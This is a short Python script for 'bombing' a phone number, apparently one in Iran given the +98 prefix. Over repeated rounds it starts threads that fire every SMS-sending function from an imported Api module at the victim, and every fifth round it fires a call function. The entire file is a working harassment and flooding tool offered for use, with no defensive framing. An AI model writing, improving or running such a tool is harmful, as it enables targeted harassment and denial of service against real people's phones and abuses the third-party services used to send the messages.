from time import sleep
from os import system
#install libs



from threading import Thread
from Api import sms, call
from time import sleep
from inspect import getmembers, isfunction 
from os import system, name

SMS_SERVICES = list(i[0] for i in getmembers(sms, isfunction))
CALL_SERVICES = list(i[0] for i in getmembers(call, isfunction))


def bombing(phone, count):
    x = 0
    phone = f"+98{phone[1:]}"
    for j in range(count):
        for k in range(len(SMS_SERVICES)):
            Thread(target=getattr(sms, SMS_SERVICES[k]), args=[phone]).start()
        if (j !=0) and (j % 5) == 0:
            Thread(target=getattr(call, CALL_SERVICES[x]), args=[phone]).start()
            x += 1
            if x > len(CALL_SERVICES) - 1:
            	x = 0
        print(f"Round {j+1} Completed XD")
        sleep(0.2)
    print("Finish")
    
if __name__ == "__main__":
    num = input('[number:0999*******]---> : ')
    yy = int(input("***Enter The Count of Round of Bombing -#>"))
    system('clear' if name == 'posix' else 'cls')
    print("*Phone Number:{}\n*Rounds: {}\n\n".format(num,yy))
    print("Start\n")
    bombing(phone=num,count=yy)
